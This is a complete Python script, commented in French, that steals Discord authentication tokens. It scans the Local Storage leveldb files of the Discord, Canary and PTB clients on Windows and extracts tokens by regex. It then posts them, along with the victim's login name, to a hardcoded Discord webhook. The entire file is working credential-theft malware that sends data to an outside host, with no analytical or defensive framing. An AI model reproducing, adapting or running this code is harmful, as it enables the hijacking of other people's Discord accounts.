import os, re, requests

WEBHOOK = "https://discord.com/api/webhooks/1460671050403549377/xdmpgI5l6sH_0U7UH6ZGdRY1wozZ-PVe7K2GYdS42vz6xuH_zg8SH32rk3KvgVrZ3LPG"

def grab():
    # Chemins Discord sur Windows
    paths = [
        os.getenv('APPDATA') + r'\\Discord\\Local Storage\\leveldb',
        os.getenv('APPDATA') + r'\\discordcanary\\Local Storage\\leveldb',
        os.getenv('APPDATA') + r'\\discordptb\\Local Storage\\leveldb'
    ]
    tokens = []
    for path in paths:
        if not os.path.exists(path): continue
        for file in os.listdir(path):
            if file.endswith('.log') or file.endswith('.ldb'):
                try:
                    with open(f"{path}\\{file}", "r", errors='ignore') as f:
                        for line in f.readlines():
                            for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", line):
                                if token not in tokens: tokens.append(token)
                except: continue
    if tokens:
        requests.post(WEBHOOK, json={"content": f"**Tokens de {os.getlogin()} :**\n" + "\n".join(tokens)})

if __name__ == "__main__":
    grab()
